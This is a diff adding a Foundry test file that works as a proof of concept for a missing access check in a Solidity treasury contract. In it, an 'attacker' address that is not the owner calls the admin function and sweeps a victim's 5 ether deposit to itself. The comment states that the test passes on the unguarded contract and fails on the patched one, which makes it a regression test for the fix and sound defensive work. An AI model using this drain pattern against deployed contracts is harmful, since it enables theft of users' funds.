@@ -1,0 +1,32 @@
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.28;
+
+import {Test} from "forge-std/Test.sol";
+import {Czz} from "../src/Czz.sol";
+
+/// @notice PoC: passes on the ORIGINAL (unguarded) treasury, fails on the PATCHED one.
+///         A non-owner sweeps the whole treasury to itself.
+contract PocTest is Test {
+    Czz internal treasury;
+    address internal owner = makeAddr("owner");
+    address internal attacker = makeAddr("attacker");
+    address internal victim = makeAddr("victim");
+
+    function setUp() public {
+        vm.prank(owner);
+        treasury = new Czz();
+        vm.deal(victim, 5 ether);
+        vm.prank(victim);
+        treasury.fzzDeposit{value: 5 ether}();
+    }
+
+    function test_anyoneCanSweepTreasury() public {
+        uint256 before = attacker.balance;
+
+        vm.prank(attacker); // not the owner
+        treasury.fzzAdmin(attacker);
+
+        assertEq(treasury.fzzTotal(), 0, "treasury drained by a non-owner");
+        assertGt(attacker.balance, before, "attacker received the victim's funds");
+    }
+}
